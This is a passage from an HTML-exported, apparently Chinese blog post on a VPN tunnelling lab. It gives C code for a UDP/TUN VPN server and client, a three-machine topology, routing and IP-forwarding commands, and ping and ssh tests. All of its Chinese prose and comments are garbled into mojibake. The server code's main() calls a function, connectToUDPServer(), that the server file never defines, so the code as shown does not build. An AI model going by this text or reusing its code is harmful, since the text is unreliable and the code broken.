<span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet))                  <span class="hljs-comment">// å½“tunçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™</span>         tunSelected(tunfd, sockfd);     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet))                  <span class="hljs-comment">// å½“socketçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™</span>         socketSelected(tunfd, sockfd);  &#125;&#125;</code></pre><h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><p><code>VPN server</code></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/if.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/if_tun.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_NUMBER 55555</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUFF_SIZE 2000</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">peerAddr</span>;</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">createTunDevice</span><span class="hljs-params">()</span> </span>&#123;   <span class="hljs-comment">// åˆ›å»º tun0 ç½‘å¡ </span>   <span class="hljs-keyword">int</span> tunfd;   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));       ifr.ifr_flags = IFF_TUN | IFF_NO_PI;   <span class="hljs-comment">// tunè®¾å¤‡ä¸åŒ…å«ä»¥å¤ªç½‘å¤´éƒ¨</span>   tunfd = open(<span class="hljs-string">&quot;/dev/net/tun&quot;</span>, O_RDWR);  <span class="hljs-comment">// æ‰“å¼€æ–‡ä»¶</span>   ioctl(tunfd, TUNSETIFF, &amp;ifr);         <span class="hljs-comment">// æ‰“å¼€è®¾å¤‡</span>   <span class="hljs-keyword">return</span> tunfd;    <span class="hljs-comment">// è¯¥å‡½æ•°æ‰§è¡Œå®Œå æ‰§è¡Œå‘½ä»¤ifconfig tunX 192.168.53.5/24 up ä¸ºtunç½‘å¡è®¾ç½®IPå¹¶å¼€å¯</span>&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">initUDPServer</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">int</span> sockfd;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server</span>;</span>    <span class="hljs-keyword">char</span> buff[<span class="hljs-number">100</span>];    <span class="hljs-built_in">memset</span>(&amp;server, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(server));    server.sin_family = AF_INET;       <span class="hljs-comment">// æœåŠ¡å™¨åœ°å€ç±»å‹ä¸ºIPV4            </span>    server.sin_addr.s_addr = htonl(INADDR_ANY);  <span class="hljs-comment">//æœåŠ¡å™¨IP</span>    server.sin_port = htons(PORT_NUMBER);        <span class="hljs-comment">// ç«¯å£å·</span>    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);  <span class="hljs-comment">//åˆ›å»ºUDPçš„å¥—æ¥å­—</span>    bind(sockfd, (struct sockaddr*) &amp;server, <span class="hljs-keyword">sizeof</span>(server));  <span class="hljs-comment">// socketç»‘å®šåœ°å€å’Œç«¯å£</span>    <span class="hljs-comment">// ç­‰å¾…è¿æ¥</span>    bzero(buff, <span class="hljs-number">100</span>);   <span class="hljs-comment">//æ¸…ç©ºç¼“å†²åŒº</span>    <span class="hljs-keyword">int</span> peerAddrLen = <span class="hljs-keyword">sizeof</span>(struct sockaddr_in); <span class="hljs-comment">//åˆå§‹åŒ–ç»“æ„ä½“</span>    <span class="hljs-keyword">int</span> len = recvfrom(sockfd, buff, <span class="hljs-number">100</span>, <span class="hljs-number">0</span>,(struct sockaddr *) &amp;peerAddr, &amp;peerAddrLen);      <span class="hljs-comment">// ç­‰å¾…æ¥æ”¶æ•°æ® </span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Connected with the client: %s\n&quot;</span>, buff);    <span class="hljs-keyword">return</span> sockfd;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;    <span class="hljs-keyword">int</span>  len;    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];  <span class="hljs-comment">//å®šä¹‰æ¥æ”¶æ•°çš„ç¼“å†²åŒº</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from TUN\n&quot;</span>);    bzero(buff, BUFF_SIZE);  <span class="hljs-comment">// æ¸…ç©ºç¼“å†²åŒº</span>    len = read(tunfd, buff, BUFF_SIZE);   <span class="hljs-comment">// è¯»å–æ¥è‡ªtun0ç½‘å¡çš„æ•°æ®ï¼Œä¿å­˜åœ¨ç¼“å†²åŒºä¸­</span>    sendto(sockfd, buff, len, <span class="hljs-number">0</span>, (struct sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));    <span class="hljs-comment">// é€šè¿‡socketå‘é€æ•°æ®</span>&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;    <span class="hljs-keyword">int</span>  len;    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from the tunnel\n&quot;</span>);    bzero(buff, BUFF_SIZE);    len = recvfrom(sockfd, buff, BUFF_SIZE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// æ¥æ”¶æ•°æ®è‡³buffï¼Œä¿å­˜æ•°æ®çš„é•¿åº¦</span>    write(tunfd, buff, len);                <span class="hljs-comment">// é€šè¿‡writeå‘é€åˆ°tun0</span>&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[])</span> </span>&#123;   <span class="hljs-keyword">int</span> tunfd, sockfd;   tunfd  = createTunDevice(); <span class="hljs-comment">// åˆ›å»ºtun0ç½‘å¡ </span>   sockfd = connectToUDPServer(); <span class="hljs-comment">// å»ºç«‹socketè¿æ¥</span>       <span class="hljs-comment">// è¿›å…¥ä¸»å¾ªç¯</span>   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;     fd_set readFDSet;     FD_ZERO(&amp;readFDSet);   <span class="hljs-comment">// å°†setæ¸…é›¶ä½¿é›†åˆä¸­ä¸å«ä»»ä½•fd</span>     FD_SET(sockfd, &amp;readFDSet); <span class="hljs-comment">// å°†socketfdåŠ å…¥seté›†åˆ</span>     FD_SET(tunfd, &amp;readFDSet);  <span class="hljs-comment">// å°†tunfdåŠ å…¥seté›†åˆ</span>     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// ç›‘å¬ä¸¤ä¸ªç«¯å£ é˜»å¡è¿›ç¨‹ï¼ŒçŸ¥é“æœ‰ä¸€ä¸ªç«¯å£æ”¶åˆ°æ•°æ®</span>                              <span class="hljs-comment">// å½“æ”¶åˆ°æ•°æ®ç¨‹åºç»§ç»­æ‰§è¡Œ å¯¹æ•°æ®è¿›è¡Œè½¬å‘</span>     <span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet))                  <span class="hljs-comment">// å½“tunçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™</span>         tunSelected(tunfd, sockfd);     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet))                  <span class="hljs-comment">// å½“socketçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™</span>         socketSelected(tunfd, sockfd);  &#125;&#125;</code></pre><p><code>VPN client</code></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;arpa/inet.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/if.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/if_tun.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BUFF_SIZE 2000</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PORT_NUMBER 55555</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SERVER_IP <span class="hljs-meta-string">&quot;10.0.2.8&quot;</span> <span class="hljs-comment">// VPN æœåŠ¡å™¨ip</span></span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">peerAddr</span>;</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">createTunDevice</span><span class="hljs-params">()</span> </span>&#123;   <span class="hljs-comment">// åˆ›å»º tun0 ç½‘å¡ </span>   <span class="hljs-keyword">int</span> tunfd;   <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ifreq</span> <span class="hljs-title">ifr</span>;</span>   <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(ifr));       ifr.ifr_flags = IFF_TUN | IFF_NO_PI;   <span class="hljs-comment">// tunè®¾å¤‡ä¸åŒ…å«ä»¥å¤ªç½‘å¤´éƒ¨</span>   tunfd = open(<span class="hljs-string">&quot;/dev/net/tun&quot;</span>, O_RDWR);  <span class="hljs-comment">// æ‰“å¼€æ–‡ä»¶</span>   ioctl(tunfd, TUNSETIFF, &amp;ifr);         <span class="hljs-comment">// æ‰“å¼€è®¾å¤‡</span>   <span class="hljs-keyword">return</span> tunfd;    <span class="hljs-comment">// è¯¥å‡½æ•°æ‰§è¡Œå®Œå æ‰§è¡Œå‘½ä»¤ifconfig tunX 192.168.53.5/24 up ä¸ºtunç½‘å¡è®¾ç½®IPå¹¶å¼€å¯</span>&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">connectToUDPServer</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-comment">//åˆ›å»ºsocketè¿æ¥ è¿æ¥åˆ°vpnæœåŠ¡å™¨</span>    <span class="hljs-keyword">int</span> sockfd;    <span class="hljs-keyword">char</span> *hello=<span class="hljs-string">&quot;Hello&quot;</span>;  <span class="hljs-comment">//æŒ‡å®šæœåŠ¡å™¨çš„åœ°å€ç»“æ„</span>    <span class="hljs-built_in">memset</span>(&amp;peerAddr, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(peerAddr));    peerAddr.sin_family = AF_INET;      <span class="hljs-comment">// æœåŠ¡å™¨åœ°å€ç±»å‹ä¸ºIPV4   </span>    peerAddr.sin_port = htons(PORT_NUMBER);    peerAddr.sin_addr.s_addr = inet_addr(SERVER_IP);    sockfd = socket(AF_INET, SOCK_DGRAM, <span class="hljs-number">0</span>);      sendto(sockfd, hello, <span class="hljs-built_in">strlen</span>(hello), <span class="hljs-number">0</span>,    <span class="hljs-comment">// è¿æ¥æœåŠ¡å™¨åå‘é€ä¸€ä¸ªæ¶ˆæ¯ hello</span>                (struct sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));    <span class="hljs-keyword">return</span> sockfd;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tunSelected</span><span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;    <span class="hljs-keyword">int</span>  len;    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];  <span class="hljs-comment">//å®šä¹‰æ¥æ”¶æ•°çš„ç¼“å†²åŒº</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from TUN\n&quot;</span>);    bzero(buff, BUFF_SIZE);  <span class="hljs-comment">// æ¸…ç©ºç¼“å†²åŒº</span>    len = read(tunfd, buff, BUFF_SIZE);   <span class="hljs-comment">// è¯»å–æ¥è‡ªtun0ç½‘å¡çš„æ•°æ®ï¼Œä¿å­˜åœ¨ç¼“å†²åŒºä¸­</span>    sendto(sockfd, buff, len, <span class="hljs-number">0</span>, (struct sockaddr *) &amp;peerAddr, <span class="hljs-keyword">sizeof</span>(peerAddr));    <span class="hljs-comment">// é€šè¿‡socketå‘é€æ•°æ®</span>&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">socketSelected</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> tunfd, <span class="hljs-keyword">int</span> sockfd)</span></span>&#123;    <span class="hljs-keyword">int</span>  len;    <span class="hljs-keyword">char</span> buff[BUFF_SIZE];    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got a packet from the tunnel\n&quot;</span>);    bzero(buff, BUFF_SIZE);    len = recvfrom(sockfd, buff, BUFF_SIZE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// æ¥æ”¶æ•°æ®è‡³buffï¼Œä¿å­˜æ•°æ®çš„é•¿åº¦</span>    write(tunfd, buff, len);                <span class="hljs-comment">// é€šè¿‡writeå‘é€åˆ°tun0</span>&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[])</span> </span>&#123;   <span class="hljs-keyword">int</span> tunfd, sockfd;   tunfd  = createTunDevice(); <span class="hljs-comment">// åˆ›å»ºtun0ç½‘å¡ </span>   sockfd = connectToUDPServer(); <span class="hljs-comment">// å»ºç«‹socketè¿æ¥</span>       <span class="hljs-comment">// è¿›å…¥ä¸»å¾ªç¯</span>   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;     fd_set readFDSet;     FD_ZERO(&amp;readFDSet);   <span class="hljs-comment">// å°†setæ¸…é›¶ä½¿é›†åˆä¸­ä¸å«ä»»ä½•fd</span>     FD_SET(sockfd, &amp;readFDSet); <span class="hljs-comment">// å°†socketfdåŠ å…¥seté›†åˆ</span>     FD_SET(tunfd, &amp;readFDSet);  <span class="hljs-comment">// å°†tunfdåŠ å…¥seté›†åˆ</span>     select(FD_SETSIZE, &amp;readFDSet, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// ç›‘å¬ä¸¤ä¸ªç«¯å£ é˜»å¡è¿›ç¨‹ï¼ŒçŸ¥é“æœ‰ä¸€ä¸ªç«¯å£æ”¶åˆ°æ•°æ®</span>                              <span class="hljs-comment">// å½“æ”¶åˆ°æ•°æ®ç¨‹åºç»§ç»­æ‰§è¡Œ å¯¹æ•°æ®è¿›è¡Œè½¬å‘</span>     <span class="hljs-keyword">if</span> (FD_ISSET(tunfd,  &amp;readFDSet))                  <span class="hljs-comment">// å½“tunçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™</span>         tunSelected(tunfd, sockfd);     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet))                  <span class="hljs-comment">// å½“socketçš„æ–‡ä»¶fdå¯ä»¥è¯»å†™</span>         socketSelected(tunfd, sockfd);  &#125;&#125;</code></pre><h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><ul><li>å®éªŒè£…ç½®</li><li>æ‹“æ‰‘å›¾</li><li>ä¸»æœºç‰©ç†ç½‘å¡é…ç½®</li></ul><h3 id="å®éªŒè£…ç½®"><a href="#å®éªŒè£…ç½®" class="headerlink" title="å®éªŒè£…ç½®"></a>å®éªŒè£…ç½®</h3><blockquote><p>host uï¼šubuntu 18.04</p><p>VPNserverï¼šubuntu 18.04</p><p>host Vï¼šubuntu 18.04</p></blockquote><h3 id="ç½‘ç»œæ‹“æ‰‘å›¾"><a href="#ç½‘ç»œæ‹“æ‰‘å›¾" class="headerlink" title="ç½‘ç»œæ‹“æ‰‘å›¾"></a>ç½‘ç»œæ‹“æ‰‘å›¾</h3><blockquote><p>æœ¬æ¬¡å®éªŒéœ€è¦ä¸‰å°ä¸»æœºï¼Œåˆ†åˆ«ä½œä¸ºhost U(VPN ç”¨æˆ·)ï¼ŒVPNæœåŠ¡, host V(å†…ç½‘ä¸»æœº)ã€‚</p><p>host Vå¤„äº192.168.60.0/24ç½‘æ®µï¼Œå±äºå†…ç½‘ã€‚</p><p>host Uå¤„äº10.0.2.0/24ç½‘æ®µï¼Œå±äºå¤–ç½‘ï¼Œhost V å’Œ host Uåœ¨æ²¡æœ‰VPNçš„æƒ…å†µä¸‹æ— æ³•é€šä¿¡ã€‚</p><p>VPN serveræœ‰ä¸¤å¼ ç½‘å¡ï¼Œä¸€å¼ ç½‘å¡çš„IPåœ°å€ä¸º192.168.60.1å¤„äº192.168.60.0/24ç½‘æ®µï¼Œä½œä¸ºhost Vçš„ç½‘å…³ï¼Œå¹¶å¯ä»¥ä¸å…¶é€šä¿¡ï¼›è€Œå¦ä¸€å¼ ç½‘å¡åœ°å€ä¸º10.0.2.8å±äºå¤–ç½‘ç½‘æ®µï¼Œå¯ä»¥ä¸host Ué€šä¿¡ï¼ŒåŒæ—¶å…¶ä½œä¸ºhost Uçš„VPNæœåŠ¡å™¨ï¼Œå®ç°ä¸host Vé€šä¿¡ã€‚</p></blockquote><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707152524640.png" alt="image-20210707152524640"></p><h3 id="ä¸»æœºç‰©ç†ç½‘å¡é…ç½®"><a href="#ä¸»æœºç‰©ç†ç½‘å¡é…ç½®" class="headerlink" title="ä¸»æœºç‰©ç†ç½‘å¡é…ç½®"></a>ä¸»æœºç‰©ç†ç½‘å¡é…ç½®</h3><table><thead><tr><th align="center">ä¸»æœº</th><th align="center">è§’è‰²</th><th align="center">IPåœ°å€</th></tr></thead><tbody><tr><td align="center">å®¢æˆ·æœº</td><td align="center">VPNå®¢æˆ·æœº/host U</td><td align="center">10.0.2.7/24</td></tr><tr><td align="center">æœåŠ¡å™¨</td><td align="center">VPNæœåŠ¡å™¨/ç½‘å…³</td><td align="center">10.0.2.8/24<br>192.168.60.1/24</td></tr><tr><td align="center">å†…ç½‘ä¸»æœº</td><td align="center">host V</td><td align="center">192.168.60.101/24</td></tr></tbody></table><p><strong>tun0 è™šæ‹Ÿç½‘å¡é…ç½®</strong></p><table><thead><tr><th align="center">ä¸»æœº</th><th align="center">è™šæ‹Ÿæ¥å£</th><th align="center">IPåœ°å€</th></tr></thead><tbody><tr><td align="center">æœåŠ¡å™¨</td><td align="center">tun0</td><td align="center">192.168.53.1/24</td></tr><tr><td align="center">å®¢æˆ·æœº</td><td align="center">tun0</td><td align="center">192.168.53.5/24</td></tr></tbody></table><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>è¿è¡Œäº†ä¸‰å°ubuntuçš„è™šæ‹Ÿæœºï¼Œå…³ç³»å¦‚ä¸Šé¢æè¿°</p><p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210707224946836.png" alt="image-20210707224946836"></p><h4 id="æœåŠ¡å™¨ä¸»æœº"><a href="#æœåŠ¡å™¨ä¸»æœº" class="headerlink" title="æœåŠ¡å™¨ä¸»æœº"></a>æœåŠ¡å™¨ä¸»æœº</h4><p>æœåŠ¡å™¨ä¸»æœºéœ€è¦ä¸¤å—ç½‘å¡ï¼Œè¿™é‡Œé€šè¿‡VMå†æ·»åŠ ä¸€å—ç½‘å¡å³å¯ï¼Œé…ç½®å¦‚å›¾</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707225616855.png" alt="image-20210707225616855" style="zoom:67%;"><p>è¿è¡Œ<code>vpnserver</code>ç¨‹åºï¼Œè¿è¡Œåä¼šå‡ºç°ä¸€ä¸ª<code>tun0</code>ç½‘å¡</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707225804438.png" alt="image-20210707225804438"></p><p>ä½¿ç”¨å‘½ä»¤é…ç½®<code>tun0</code></p><pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span> tun<span class="hljs-number">0</span> <span class="hljs-number">192.168.53.1</span>/<span class="hljs-number">24</span> up</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707230038034.png" alt="image-20210707230038034"></p><p>ç”±äº VPN Server éœ€è¦åœ¨ç§ç½‘å’Œéš§é“ä¹‹é—´è½¬å‘æ•°æ®åŒ…ï¼Œå› æ­¤å®ƒä¹Ÿéœ€è¦å……å½“ç½‘å…³ï¼Œè¿™æ˜¯é€šè¿‡åœ¨ VPN Server ä¸Šå¯ç”¨ IP è½¬å‘æ¥å®ç°çš„ã€‚</p><pre><code class="hljs apache"><span class="hljs-attribute">sysctl</span> net.ipv<span class="hljs-number">4</span>.ip_forward=<span class="hljs-number">1</span></code></pre><h4 id="host-v"><a href="#host-v" class="headerlink" title="host v"></a>host v</h4><p>å®¢æˆ·ç«¯è¿è¡Œ<code>./vpnclient</code>ï¼Œä¹‹åä¼šå‡ºç°ä¸€ä¸ª<code>tun0</code>æ¥å£ï¼Œç„¶åå¯¹å…¶é…ç½®</p><pre><code class="hljs apache"><span class="hljs-attribute">ifconfig</span> tun<span class="hljs-number">0</span> <span class="hljs-number">192.168.53.5</span>/<span class="hljs-number">24</span> up</code></pre><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707232611251.png" alt="image-20210707232611251" style="zoom:67%;"><h4 id="é…ç½®è·¯ç”±"><a href="#é…ç½®è·¯ç”±" class="headerlink" title="é…ç½®è·¯ç”±"></a>é…ç½®è·¯ç”±</h4><p>ç»è¿‡ä»¥ä¸Šä¸¤æ­¥ï¼Œéš§é“å°±å»ºç«‹èµ·æ¥äº†ï¼Œç„¶åæˆ‘ä»¬è®¾ç½®è·¯ç”±è·¯å¾„ä»¥å°†é¢„æœŸæµé‡å¼•å¯¼åˆ°å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æœºå™¨ä¸Šçš„éš§é“ã€‚åœ¨ host vä¸Šï¼Œæˆ‘ä»¬å°†æ‰€æœ‰è¿›å…¥ä¸“ç”¨ç½‘ç»œ (192.168.60.0/24) çš„æ•°æ®åŒ…å®šå‘åˆ° tun0 æ¥å£ï¼Œæ•°æ®åŒ…å°†ä»è¯¥æ¥å£é€šè¿‡ VPN éš§é“è½¬å‘ã€‚æˆ‘ä»¬ä½¿ç”¨ route å‘½ä»¤åœ¨ host v ä¸Šæ·»åŠ ä»¥ä¸‹è·¯ç”±æ¡ç›®ï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">route</span> add -net <span class="hljs-number">192.168.60.0</span>/<span class="hljs-number">24</span> tun<span class="hljs-number">0</span></code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707233335994.png" alt="image-20210707233335994"></p><p>åœ¨æœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå°†æµå‘ 192.168.53.0/24 ç½‘ç»œçš„æµé‡å®šå‘åˆ° tun0 æ¥å£</p><p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210707233447176.png" alt="image-20210707233447176"></p><p>å†…ç½‘ä¸»æœºä¸Šä¸ºäº†é€šè¿‡ VPN éš§é“å°† Host V ï¼ˆå†…ç½‘ä¸»æœºï¼‰å›å¤å‘é€åˆ° Host Uï¼Œæˆ‘ä»¬åœ¨ Host V ä¸Šæ·»åŠ äº†ä¸€ä¸ªè·¯ç”±æ¡ç›®ï¼Œå®ƒå°†å»å¾€ Host U ç½‘ç»œçš„æ•°æ®åŒ…è·¯ç”±åˆ° VPN Serveã€‚ä» VPN Serverï¼Œè¿™ä¸ªæ•°æ®åŒ…å°†é€šè¿‡ VPN éš§é“åˆ°è¾¾ VPN Clientï¼Œæœ€ç»ˆåˆ°è¾¾ Host Uã€‚ ä¸‹é¢æ˜¾ç¤ºäº† Host V ä¸Šçš„è·¯ç”±æ¡ç›®</p><pre><code class="hljs apache"><span class="hljs-attribute">route</span> add -net <span class="hljs-number">192.168.53.0</span>/<span class="hljs-number">24</span> gw <span class="hljs-number">192.168.60.1</span> ens<span class="hljs-number">33</span></code></pre><p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210707234034756.png" alt="image-20210707234034756"></p><h2 id="éªŒè¯é€šä¿¡"><a href="#éªŒè¯é€šä¿¡" class="headerlink" title="éªŒè¯é€šä¿¡"></a>éªŒè¯é€šä¿¡</h2><h3 id="ping-æµ‹è¯•"><a href="#ping-æµ‹è¯•" class="headerlink" title="ping æµ‹è¯•"></a>ping æµ‹è¯•</h3><p>cliet ping å†…ç½‘ä¸»æœº</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707232714091.png" alt="image-20210707232714091"></p><p>å†…ç½‘ä¸»æœºping client</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707233045553.png" alt="image-20210707233045553"></p><p>å†…ç½‘ä¸»æœºè¿½è¸ªè·¯ç”±ï¼Œå¯ä»¥çœ‹åˆ°ç»è¿‡ç½‘å…³<code>192.168.60.1</code>åˆ°è¾¾äº†ç›®çš„åœ°å€</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707174129705.png" alt="image-20210707174129705"></p><p>æŸ¥çœ‹vpnclientå’Œvpnserverç¨‹åºçš„è¿è¡Œæƒ…å†µ</p><p><strong>VPN client</strong></p><blockquote><p>åœ¨å‘é€ ping è¯·æ±‚æ—¶ï¼Œvpnclientåæ˜ å·²æ”¶åˆ° TUN æ¥å£ä¸Šçš„æ•°æ®åŒ…ï¼ˆping è¯·æ±‚ï¼‰å¹¶è¿ç»­æ”¶åˆ°éš§é“ä¸­çš„åŒ…ï¼ˆping å›å¤ï¼‰</p></blockquote><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707234515470.png" alt="image-20210707234515470" style="zoom: 67%;"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708000049518.png" alt="image-20210708000049518"></p><p><strong>VPN server</strong></p><blockquote><p>åœ¨ vpnserverä¸Šï¼Œç¨‹åºåæ˜ ä»éš§é“æ¥æ”¶æ•°æ®åŒ…ï¼ˆping è¯·æ±‚ï¼‰ï¼Œç„¶åä» TUN æ¥æ”¶æ•°æ®åŒ…ï¼ˆping å›å¤ï¼‰</p></blockquote><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210707234610430.png" alt="image-20210707234610430" style="zoom:67%;"><h3 id="sshæµ‹è¯•"><a href="#sshæµ‹è¯•" class="headerlink" title="sshæµ‹è¯•"></a>sshæµ‹è¯•</h3><p>åœ¨host Væ‰§è¡Œ</p><pre><code class="hljs sh">ssh root@192.168.60.101</code></pre><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708000433140.png" alt="image-20210708000433140" style="zoom:80%;"><p>åœ¨ host Uä¸Šæ‰§è¡Œ</p><pre><code class="hljs sh">ssh root@10.0.2.7</code></pre><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210708000944524.png" alt="image-20210708000944524" 